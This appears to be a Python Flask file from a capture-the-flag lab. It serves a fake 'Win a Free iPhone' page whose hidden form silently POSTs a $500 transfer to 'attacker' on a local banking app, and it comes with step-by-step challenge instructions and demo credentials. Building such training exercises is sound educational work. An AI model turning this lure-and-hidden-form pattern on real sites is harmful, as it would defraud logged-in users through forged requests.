#!/usr/bin/env python3
"""
Attacker's Website - CSRF Exploit Page

This simulates a malicious website that exploits the CSRF vulnerability
in the banking application.
"""

from flask import Flask

app = Flask(__name__)

@app.route('/')
def index():
    """Malicious page that performs CSRF attack"""
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Win a Free iPhone!</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                max-width: 800px;
                margin: 50px auto;
                padding: 20px;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
            }
            .prize-box {
                background: white;
                color: #333;
                padding: 40px;
                border-radius: 15px;
                text-align: center;
                box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            }
            h1 {
                color: #667eea;
                font-size: 2.5em;
            }
            .prize {
                font-size: 4em;
                margin: 20px 0;
            }
            .btn {
                display: inline-block;
                padding: 15px 40px;
                background: #667eea;
                color: white;
                text-decoration: none;
                border-radius: 30px;
                font-size: 1.2em;
                margin: 20px 0;
                cursor: pointer;
                border: none;
            }
            .btn:hover {
                background: #764ba2;
            }
            .info {
                background: #f0f0f0;
                padding: 20px;
                margin: 30px 0;
                border-radius: 10px;
                text-align: left;
            }
            code {
                background: #f4f4f4;
                padding: 2px 6px;
                border-radius: 3px;
                color: #e83e8c;
            }
        </style>
    </head>
    <body>
        <div class="prize-box">
            <div class="prize">📱</div>
            <h1>Congratulations!</h1>
            <p style="font-size: 1.3em;">You've been selected to win a FREE iPhone 15 Pro!</p>

            <!-- CSRF Attack Form (Hidden) -->
            <form id="csrf-form" action="http://localhost:3003/transfer" method="POST" style="display:none;">
                <input type="hidden" name="to" value="attacker">
                <input type="hidden" name="amount" value="500">
            </form>

            <button class="btn" onclick="claimPrize()">Claim Your Prize!</button>

            <div class="info">
                <h3>🎯 CSRF Challenge Instructions</h3>
                <p><strong>This is the attacker's malicious website.</strong></p>

                <p><strong>To complete the challenge:</strong></p>
                <ol>
                    <li>Open <code>http://localhost:3003</code> in a new tab</li>
                    <li>Login with username: <code>alice</code>, password: <code>password123</code></li>
                    <li>Keep that tab open (stay logged in)</li>
                    <li>Come back to this tab and click "Claim Your Prize!"</li>
                    <li>Return to <code>http://localhost:3003</code> to see the CSRF attack result</li>
                </ol>

                <p><strong>What happens:</strong></p>
                <p>When you click the button, a hidden form submits a POST request to the banking app,
                transferring $500 from alice to the attacker. Because alice is logged in, the browser
                automatically includes her session cookie, and the bank accepts the request!</p>

                <p><strong>After the attack:</strong></p>
                <p>Check the banking app to see the transfer and retrieve the flag.</p>
            </div>
        </div>

        <script>
            function claimPrize() {
                // Submit the hidden CSRF form
                document.getElementById('csrf-form').submit();

                // Show success message
                alert('Prize claim submitted! Check the banking app to see what happened...');
            }
        </script>
    </body>
    </html>
    """
    return html

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
